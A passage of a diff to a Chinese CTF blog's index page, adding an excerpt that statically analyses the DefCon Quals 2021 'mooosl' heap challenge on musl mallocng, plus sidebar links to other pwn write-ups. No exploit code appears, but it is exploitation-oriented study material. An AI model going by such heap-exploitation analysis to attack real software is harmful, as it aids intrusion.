+<p>get_hash，返回一个hash值，返回后只取低12位，根据这个hash得到hash_map[hash&amp;0xfff]，先将hash_map[hash&amp;0xfff]原有的值保存在prev_hash_map，然后将0x30 chunk的地址存入hash_map[hash&amp;0xfff]<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973758763-1620973758765.png" alt="title"></p>
+<p>query，查询功能，根据输入的key，找到对应的value并以hex字符串形式输出。注意到这里调了set_key，会先申请chunk用于存放key，最后再free掉。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973813101-1620973813103.png" alt="title"></p>
+<p>查找过程是遍历hash_map找到对应key，如果prev_hash_map不为零，则会打印出prev_hash_map的数据<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620979440795-1620979440796.png" alt="title"></p>
+	
+
+	</div>
+  <a type="button" href="/2021/06/26/借助DefCon-Quals-2021的mooosl学习musl-mallocng（漏洞利用篇）/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/241104" target="_blank" rel="noopener">借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）</a></p>
+<p>上篇我们大致过了一遍musl libc 1.2.2的mallocng源码，了解到musl堆管理器用以下的结构管理着meta、group以及chunk。本篇我们继续来分析mooosl这道题的解题思路。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620877156490-1620877156490.png" alt="title"></p>
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>保护全开<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961337503-1620961337534.png" alt="title"></p>
+<p>程序主要提供了<code>store</code>、<code>query</code>、<code>delete</code>这几个功能，下面逐个功能进行分析<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961459130-1620961459131.png" alt="title"></p>
+<p>sotre，申请0x30的chunk，用于存放key、value以及对应的size，另外还会算出hash和prev_hash_map（保存着hash_map先前在该处的指针）<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973183066-1620973183067.png" alt="title"></p>
+<p>set_key和set_value，比较类似，根据输入的size去申请chunk，然后填入key和value，所以store方法一共会申请3个chunk<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620962248015-1620962248017.png" alt="title"></p>
+<p>get_hash，返回一个hash值，返回后只取低12位，根据这个hash得到hash_map[hash&amp;0xfff]，先将hash_map[hash&amp;0xfff]原有的值保存在prev_hash_map，然后将0x30 chunk的地址存入hash_map[hash&amp;0xfff]<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973758763-1620973758765.png" alt="title"></p>
+<p>query，查询功能，根据输入的key，找到对应的value并以hex字符串形式输出。注意到这里调了set_key，会先申请chunk用于存放key，最后再free掉。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973813101-1620973813103.png" alt="title"></p>
+<p>查找过程是遍历hash_map找到对应key，如果prev_hash_map不为零，则会打印出prev_hash_map的数据<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620979440795-1620979440796.png" alt="title"></p>
+	
+	</div>
+  <a type="button" href="/2021/06/26/借助DefCon-Quals-2021的mooosl学习musl-mallocng（漏洞利用篇）/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/05/31/借助DefCon-Quals-2021的mooosl学习musl-mallocng（源码审计篇）/" title="DefCon Quals 2021 mooosl的解题思路">借助DefCon Quals 2021的mooosl学习musl mallocng（源码审计篇）</a>
 		</h3>
 		</div>
@@ -508,13 +736,17 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
+			<li><a href="/categories/BIOS/">BIOS<span>1</span></a></li>
+		
 			<li><a href="/categories/Docs/">Docs<span>1</span></a></li>
+		
+			<li><a href="/categories/NBOS/">NBOS<span>2</span></a></li>
 		
 			<li><a href="/categories/SerenityOS/">SerenityOS<span>3</span></a></li>
 		
 			<li><a href="/categories/macOS/">macOS<span>1</span></a></li>
 		
-			<li><a href="/categories/musl-libc/">musl-libc<span>1</span></a></li>
+			<li><a href="/categories/musl-libc/">musl-libc<span>2</span></a></li>
 		
 		</ul>
 	</div>
@@ -525,9 +757,9 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/环境配置/">环境配置<span>2</span></a></li>
+			<li><a href="/tags/解题思路/">解题思路<span>8</span></a></li>
 		
-			<li><a href="/tags/解题思路/">解题思路<span>4</span></a></li>
+			<li><a href="/tags/环境配置/">环境配置<span>2</span></a></li>
 		
 		 
 		</ul>
@@ -541,23 +773,23 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2021/06/26/解决第一个UEFI-PWN——Accessing-the-Truth解题思路/"  title="Pwn2Win CTF 2021 Accessing the Truth的解题思路" ><i class="fa fa-file-o"></i>解决第一个UEFI PWN——Accessing th...</a>
+      </li>
+    
+      <li>
+        <a href="/2021/06/26/PWN掉一款小型开源OS——续篇：内核态PWN/"  title="DefCon Quals 2021 coooinbase-kernel的解题思路" ><i class="fa fa-file-o"></i>PWN掉一款小型开源OS——续篇：内核态PWN</a>
+      </li>
+    
+      <li>
+        <a href="/2021/06/26/PWN掉一款小型开源OS——用户态利用/"  title="DefCon Quals 2021 coooinbase的解题思路" ><i class="fa fa-file-o"></i>PWN掉一款小型开源OS——用户态利用</a>
+      </li>
+    
+      <li>
+        <a href="/2021/06/26/借助DefCon-Quals-2021的mooosl学习musl-mallocng（漏洞利用篇）/"  title="DefCon Quals 2021 mooosl的解题思路" ><i class="fa fa-file-o"></i>借助DefCon Quals 2021的mooosl学...</a>
+      </li>
+    
+      <li>
         <a href="/2021/05/31/借助DefCon-Quals-2021的mooosl学习musl-mallocng（源码审计篇）/"  title="DefCon Quals 2021 mooosl的解题思路" ><i class="fa fa-file-o"></i>借助DefCon Quals 2021的mooosl学...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/21/hxpCTF2020-wisdom2：Ptrace参数未校验引发的SerenityOS内核提权/"  title="hxpCTF2020 wisdom2的解题思路" ><i class="fa fa-file-o"></i>hxpCTF2020 wisdom2：Ptrace参数...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/01/31/CVE-2019-20172：36C3 wisdom中的SerenityOS内核提权/"  title="HXP 36C3 CTF wisdom的解题思路" ><i class="fa fa-file-o"></i>CVE-2019-20172：36C3 wisdom中...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/01/31/编译SerenityOS操作系统/"  title="SerenityOS编译步骤" ><i class="fa fa-file-o"></i>编译SerenityOS操作系统</a>
-      </li>
-    
-      <li>
-        <a href="/2020/05/01/某次强制关机后引发的血案/"  title="记录Mac环境配置过程" ><i class="fa fa-file-o"></i>某次强制关机后引发的血案</a>
       </li>
     
   </ul>
